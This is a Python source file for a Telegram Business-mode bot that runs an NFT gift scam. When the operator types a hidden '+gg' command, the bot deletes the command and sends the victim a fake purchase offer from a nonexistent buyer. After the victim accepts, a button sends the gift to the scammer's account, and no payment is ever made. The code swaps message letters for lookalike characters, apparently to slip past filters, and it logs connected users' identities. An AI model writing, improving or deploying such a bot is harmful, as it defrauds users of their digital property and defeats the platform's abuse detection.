import asyncio
import json
import logging
import os
import random
import re
import uuid
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    CallbackQuery,
    LinkPreviewOptions,
    BusinessConnection,
)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
NFT_TRANSFER_LINK = os.getenv("NFT_TRANSFER_LINK", "tg://send_gift?to=dobrks")
STAR_EMOJI_ID = os.getenv("STAR_EMOJI_ID", "5242644275014951846")
GRAM_EMOJI_ID = os.getenv("GRAM_EMOJI_ID", "5193179982775476271")
CHECK_EMOJI_ID = os.getenv("CHECK_EMOJI_ID", "5776375003280838798")
CROSS_EMOJI_ID = os.getenv("CROSS_EMOJI_ID", "5778527486270770928")
GIFT_EMOJI_ID = os.getenv("GIFT_EMOJI_ID", "5985472565508838112")

BUYER_NAME = "CaseIB"

if not BOT_TOKEN or ":" not in BOT_TOKEN:
    raise ValueError("BOT_TOKEN is required")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
offers = {}

CONNECTIONS_FILE = "connections.json"
connections = {}

def load_connections():
    global connections
    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                connections = json.load(f)
            print(f"[CONN] loaded {len(connections)} connections")
        except Exception as e:
            print(f"[CONN] load failed: {e}")
            connections = {}

def save_connections():
    try:
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(connections, f, ensure_ascii=False)
    except Exception as e:
        print(f"[CONN] save failed: {e}")

load_connections()

@dp.business_connection()
async def on_business_conn(conn: BusinessConnection):
    connections[conn.id] = {
        "first_name": conn.user.first_name or "",
        "last_name": conn.user.last_name or "",
        "username": conn.user.username or "",
        "user_id": conn.user.id,
    }
    save_connections()
    print(f"[BIZ] conn={conn.id} name={conn.user.first_name} @{conn.user.username}")

def format_amount(value: str) -> str:
    try:
        num = int(value)
        return f"{num:,}"
    except ValueError:
        return value

def mask_stars(currency: str) -> str:
    c = currency.strip().lower()
    if c == "stars":
        return "Ѕtаrѕ"
    elif c == "ton":
        return "TON"
    return currency.upper() if len(currency) <= 4 else currency.capitalize()

HOMOGLYPH_CYR = {
    "а": "a", "е": "e", "о": "o", "с": "c", "р": "p", "х": "x", "у": "y",
}
HOMOGLYPH_CYR_CAP = {
    "А": "Α", "В": "Β", "Е": "Ε", "К": "Κ", "М": "Μ", "Н": "Η",
    "О": "Ο", "Р": "Ρ", "С": "Ϲ", "Т": "Τ", "У": "Υ", "Х": "Χ",
}
HOMOGLYPH_LAT_TO_CYR = {
    "a": "а", "e": "е", "o": "о", "p": "р", "c": "с", "x": "х", "y": "у",
}
HOMOGLYPH_LAT_CAP = {
    "A": "Α", "B": "Β", "E": "Ε", "H": "Η", "I": "Ι", "K": "Κ",
    "M": "Μ", "N": "Ν", "O": "Ο", "P": "Ρ", "T": "Τ", "X": "Χ",
    "Y": "Υ", "Z": "Ζ", "C": "Ϲ",
}

def randomize_all(text: str, probability: float = 1.0) -> str:
    result = []
    i = 0
    n = len(text)
    while i < n:
        if text[i] == "<":
            end = text.find(">", i)
            if end != -1:
                result.append(text[i:end + 1])
                i = end + 1
                continue
        if text[i:i+7].lower() == "http://" or text[i:i+8].lower() == "https://":
            end = i
            while end < n and text[end] not in " \n\t<>":
                end += 1
            result.append(text[i:end])
            i = end
            continue
        if text[i] == "@":
            end = i + 1
            while end < n and (text[end].isalnum() or text[end] == "_"):
                end += 1
            result.append(text[i:end])
            i = end
            continue
        if text[i:i+2] == "@@" and i + 2 < n:
            end = text.find("@@", i + 2)
            if end != -1:
                result.append(text[i:end + 2])
                i = end + 2
                continue
        char = text[i]
        if random.random() < probability:
            if char in HOMOGLYPH_CYR_CAP:
                result.append(HOMOGLYPH_CYR_CAP[char])
            elif char in HOMOGLYPH_CYR:
                result.append(HOMOGLYPH_CYR[char])
            elif char in HOMOGLYPH_LAT_CAP:
                result.append(HOMOGLYPH_LAT_CAP[char])
            elif char in HOMOGLYPH_LAT_TO_CYR:
                result.append(HOMOGLYPH_LAT_TO_CYR[char])
            else:
                result.append(char)
        else:
            result.append(char)
        i += 1
    return "".join(result)

def gift_emoji() -> str:
    return f'<tg-emoji emoji-id="{GIFT_EMOJI_ID}">🎁</tg-emoji>'

def check_emoji() -> str:
    return f'<tg-emoji emoji-id="{CHECK_EMOJI_ID}">✔️</tg-emoji>'

def cross_emoji() -> str:
    return f'<tg-emoji emoji-id="{CROSS_EMOJI_ID}">❌</tg-emoji>'

SLUG_RE = re.compile(r"^([A-Za-z][A-Za-z0-9_\-]*?)-(\d+)$")

def parse_nft_input(arg: str):
    arg = arg.strip()
    if "t.me/nft/" in arg or "telegram.me/nft/" in arg:
        slug = arg.rstrip("/").split("/")[-1]
    else:
        slug = arg
    m = SLUG_RE.match(slug)
    if not m:
        raise ValueError(f"Неверный формат NFT ссылки/slug: '{arg}'")
    name_raw = m.group(1)
    num = int(m.group(2))
    name = re.sub(r'(?<!^)(?=[A-Z])', ' ', name_raw)
    name = name.replace("-", " ").replace("_", " ")
    nft_url = f"https://t.me/nft/{slug}"
    return name, num, nft_url

TEXTS = {
    "ru": {
        "offer_template": "Пользователь <b>{buyer}</b> предлагает Вам <b>{amount}</b> за подарок <b>{nft_link}.</b>",
        "offer_expires": "Предложение действует ещё <b>5ч 59м.</b>",
        "btn_accept": "Принять",
        "btn_decline": "Отклонить",
        "btn_transfer": "Передать",
        "declined": "Вы отклонили предложение",
    },
    "us": {
        "offer_template": "User <b>{buyer}</b> offers You <b>{amount}</b> for gift <b>{nft_link}.</b>",
        "offer_expires": "Offer valid for <b>5h 59m.</b>",
        "btn_accept": "Accept",
        "btn_decline": "Decline",
        "btn_transfer": "Send gift",
        "declined": "You have declined the offer",
    },
    "ua": {
        "offer_template": "Користувач <b>{buyer}</b> пропонує Вам <b>{amount}</b> за подарунок <b>{nft_link}.</b>",
        "offer_expires": "Пропозиція діє ще <b>5г 59хв.</b>",
        "btn_accept": "Прийняти",
        "btn_decline": "Відхилити",
        "btn_transfer": "Передати",
        "declined": "Ви відхилили пропозицію",
    },
}

def get_lang(code: str) -> str:
    if not code:
        return "ru"
    c = code.strip().lower()
    return c if c in TEXTS else "ru"

def get_offer_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=t["btn_decline"],
                callback_data=f"decline_{order_id}",
                icon_custom_emoji_id=CROSS_EMOJI_ID
            ),
            InlineKeyboardButton(
                text=t["btn_accept"],
                callback_data=f"accept_{order_id}",
                icon_custom_emoji_id=CHECK_EMOJI_ID
            ),
        ]
    ])

def get_deal_keyboard(order_id: str, lang: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text=TEXTS[lang]["btn_transfer"],
                url=NFT_TRANSFER_LINK
            )
        ]
    ])

# ==================== ХЭНДЛЕР КОМАНДЫ +gg ====================
@dp.business_message(F.text.startswith("+gg "))
async def cmd_gg_business(message: types.Message):
    print(f"[DEBUG] Сработал +gg: {message.text!r}")
    args = message.text.split()
    
    # Формат ожидает: +gg <nft_link> <amount> <currency> <lang>
    # Пример: +gg solid-123 125 stars ru
    if len(args) < 3:
        print(f"[DEBUG] Ошибка: Недостаточно аргументов. Ожидалось 3+, получено {len(args)-1}")
        try:
            await bot.delete_business_messages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            )
        except Exception:
            pass
        return

    nft_arg = args[1]
    amount = args[2]
    currency = args[3].strip().lower() if len(args) > 3 else "stars"
    lang = get_lang(args[4] if len(args) > 4 else "ru")
    
    try:
        nft_name, nft_num, nft_url = parse_nft_input(nft_arg)
        nft_num_formatted = format_amount(str(nft_num))
        nft_full_name = f"{nft_name} #{nft_num_formatted}"
    except ValueError as e:
        print(f"[DEBUG] Ошибка парсинга NFT: {e}")
        try:
            await bot.delete_business_messages(
                business_connection_id=message.business_connection_id,
                message_ids=[message.message_id]
            )
        except Exception:
            pass
        return

    t = TEXTS[lang]
    amount_formatted = format_amount(amount)
    currency_text = mask_stars(currency)
    order_id = f"TG-{uuid.uuid4().hex[:10].upper()}"
    
    offers[order_id] = {
        "order_id": order_id,
        "nft_url": nft_url,
        "nft_name": nft_full_name,
        "amount": amount_formatted,
        "currency": currency,
        "lang": lang,
        "status": "pending",
        "business_connection_id": message.business_connection_id,
        "chat_id": message.chat.id,
    }
    
    offer_text_raw = t['offer_template'].format(
        buyer="@@BUYER@@",
        amount="@@AMOUNT@@",
        nft_link="@@NFT@@",
    )
    offer_text_rand = randomize_all(offer_text_raw, probability=1.0)
    nft_name_rand = randomize_all(nft_full_name, probability=1.0)
    nft_link = f'<a href="{nft_url}">{nft_name_rand}</a>'
    
    offer_text = (
        offer_text_rand
        .replace("@@BUYER@@", BUYER_NAME)
        .replace("@@AMOUNT@@", f"{amount_formatted} {currency_text}")
        .replace("@@NFT@@", nft_link)
    )
    
    expires_rand = randomize_all(t['offer_expires'], probability=1.0)
    preview_line = f'<a href="{nft_url}">&#8203;</a>'
    text = f"{preview_line}{offer_text}\n\n{expires_rand}"
    
    try:
        await bot.send_message(
            chat_id=message.chat.id,
            text=text,
            reply_markup=get_offer_keyboard(order_id, lang),
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                show_above_text=True,
                prefer_large_media=True,
            ),
            parse_mode="HTML",
            business_connection_id=message.business_connection_id,
        )
        print(f"[OFFER] Оффер +gg успешно отправлен! Оффер ID: {order_id}, Валюта: {currency_text}")
    except Exception as e:
        print(f"[SEND ERROR] Ошибка отправки сообщения: {e}")
        
    try:
        await bot.delete_business_messages(
            business_connection_id=message.business_connection_id,
            message_ids=[message.message_id]
        )
    except Exception:
        pass

@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)
    if not offer or offer["status"] != "pending":
        await callback.answer()
        return
    offer["status"] = "accepted"
    lang = offer["lang"]
    currency_text = mask_stars(offer['currency'])
    nft_name_rand = randomize_all(offer['nft_name'], probability=1.0)
    
    alert_texts = {
        "ru": f"Предложение о продаже {offer['nft_name']} успешно принято.\n\nПередайте подарок покупателю для зачисления {offer['amount']} {currency_text} на ваш баланс.",
        "us": f"Offer to sell {offer['nft_name']} has been successfully accepted.\n\nTransfer the gift to the buyer to receive {offer['amount']} {currency_text} to your balance.",
        "ua": f"Пропозицію щодо продажу {offer['nft_name']} успішно прийнято.\n\nПередайте подарунок покупцю для зарахування {offer['amount']} {currency_text} на ваш баланс."
    }
    await callback.answer(alert_texts.get(lang, alert_texts["ru"]), show_alert=True)
    
    nft_link = f'<a href="{offer["nft_url"]}">{nft_name_rand}</a>'
    preview_line = f'<a href="{offer["nft_url"]}">&#8203;</a>'
    
    if lang == "ru":
        text = (
            f"{preview_line}{gift_emoji()} Подарок: <b>{nft_link}</b> успешно продан!\n\n"
            f"• <b>Передайте подарок покупателю для зачисления "
            f"{currency_text}.</b>"
        )
    elif lang == "ua":
        text = (
            f"{preview_line}{gift_emoji()} Подарунок: <b>{nft_link}</b> успішно продано!\n\n"
            f"• <b>Передайте подарунок покупцю для зарахування "
            f"{currency_text}.</b>"
        )
    else:
        text = (
            f"{preview_line}{gift_emoji()} Gift: <b>{nft_link}</b> successfully sold!\n\n"
            f"• <b>Transfer the gift to the buyer to receive "
            f"{currency_text}.</b>"
        )
        
    try:
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            business_connection_id=callback.message.business_connection_id,
            text=text,
            reply_markup=get_deal_keyboard(order_id, lang),
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                show_above_text=True,
                prefer_large_media=True
            ),
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[EDIT ERROR] {e}")

@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    order_id = callback.data.split("_", 1)[1]
    offer = offers.get(order_id)
    if not offer or offer["status"] != "pending":
        await callback.answer()
        return
    offer["status"] = "declined"
    lang = offer["lang"]
    t = TEXTS[lang]
    declined_rand = randomize_all(t['declined'], probability=1.0)
    text = f"{cross_emoji()} {declined_rand}"
    try:
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            business_connection_id=callback.message.business_connection_id,
            text=text,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"[EDIT ERROR] {e}")
    await callback.answer()

@dp.callback_query(F.data.startswith("confirm_"))
async def process_confirm(callback: CallbackQuery):
    await callback.answer()

@dp.business_message()
async def debug_business(message: types.Message):
    print(f"[DEBUG LOG ALL] Любое пришедшее бизнес-сообщение: {message.text!r}")

async def main():
    print("Бот запущен (Business Mode с командой +gg)...")
    await dp.start_polling(
        bot,
        allowed_updates=[
            "message",
            "callback_query",
            "business_connection",
            "business_message",
            "edited_business_message",
            "deleted_business_messages",
        ]
    )

if __name__ == "__main__":
    asyncio.run(main())
